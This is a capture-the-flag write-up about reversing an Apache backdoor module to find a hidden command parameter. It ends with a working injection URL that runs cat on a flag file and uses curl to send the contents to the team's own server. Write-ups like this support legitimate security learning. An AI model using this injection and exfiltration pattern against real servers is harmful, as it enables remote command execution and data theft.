Hello guys ,

So i will explain my team solution for this task 

It was really amazing task because its reverse + web so it need lot of knowledge to solve it

So first we check the task !

![capture d ecran 2017-10-19 a 11 23 25 am](https://user-images.githubusercontent.com/7364615/31766621-fdbd0a96-b4bf-11e7-9d15-05c19c028ec8.png)

Next we have backdoor.so library used with the apache server 

If we need to solve this should first understand the backdoor.so how it works


So it check first for GET\x00ndex.html 

![capture d ecran 2017-10-19 a 11 30 37 am](https://user-images.githubusercontent.com/7364615/31766872-f6d81eea-b4c0-11e7-86ee-08834d0567d4.png)

![capture d ecran 2017-10-19 a 11 31 12 am](https://user-images.githubusercontent.com/7364615/31766893-09930b80-b4c1-11e7-8ee6-dd843d21a15e.png)

OK so we need to send  https://indianer.flatearth.fluxfingers.net//x00ndex.html as first to make it all work 

then there is system function that get argument from url , but its not clear what name is this arg

so we make our prog to get the arg name 

![capture d ecran 2017-10-19 a 11 33 34 am](https://user-images.githubusercontent.com/7364615/31766979-60bdb798-b4c1-11e7-912d-2ab3d29b23aa.png)

and it was "dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp" So this is the second part 

https://indianer.flatearth.fluxfingers.net/x00ndex.html?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=

what Next?

first what we tried to do it to understand where the flag will be shown

We tried first simple check like https://indianer.flatearth.fluxfingers.net/x00ndex.html_dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=ls

but for sure no output there :(

After some check we get that the '_' is replaced with ' '

So no need space here 

![capture d ecran 2017-10-19 a 11 37 02 am](https://user-images.githubusercontent.com/7364615/31767126-da3ef960-b4c1-11e7-91e3-776e15b18598.png)

Also flag will not shown here in the web part 

So if we make the flag redirected  somewhere it maybe will work 

So curl is the best solution , but we figure this out when the ctf already end :( and we didnt get any points for this task

Anyway it was Cool task to improve our skills 

Ok lets continue !

So we need curl? ok so we will send the flag to our server using curl 

So our last solution was to make this request and its work :D 

https://indianer.flatearth.fluxfingers.net/x00ndex.html?dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=curl_serverip/`cat_/var/www/flag.txt`


![capture d ecran 2017-10-19 a 11 15 22 am](https://user-images.githubusercontent.com/7364615/31767276-57b35d0a-b4c2-11e7-8f09-1a162d4cc949.png)

No points but we did it :D 


Thanks 
